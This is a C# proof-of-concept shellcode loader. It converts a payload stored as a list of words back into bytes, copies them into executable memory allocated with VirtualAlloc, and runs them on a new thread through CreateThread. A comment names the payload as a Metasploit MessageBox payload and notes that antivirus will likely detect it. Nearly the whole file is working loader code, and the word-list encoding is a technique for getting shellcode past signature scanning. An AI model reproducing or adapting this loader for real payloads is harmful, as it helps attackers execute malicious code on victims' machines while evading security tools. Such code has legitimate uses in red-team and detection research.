using System.Runtime.InteropServices;

namespace POC
{
    internal class Program
    {
        /*
         * Proof of concept showing the payload being transformed back into individual bytecode and executing.
         * Uses Metasploit MessageBox payload with default parameters, so AV will probably trigger on compile.
         */

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, ulong size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            Payload payload = new Payload();
            List<byte> data = [];
            byte[] decrypted = new byte[payload.encodedPayload.Length];

            // Basic transfer back to bytes
            foreach (string word in payload.encodedPayload)
            {
                data.Add((byte)Array.IndexOf(payload.keyWords, word));
            }
            decrypted = data.ToArray();


            IntPtr vallocAdress = VirtualAlloc(IntPtr.Zero, (ulong)decrypted.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(decrypted, 0, vallocAdress, decrypted.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;

            hThread = CreateThread(0, 0, vallocAdress, 0, 0, ref threadId);
            WaitForSingleObject(hThread, int.MaxValue);
        }
    }
}
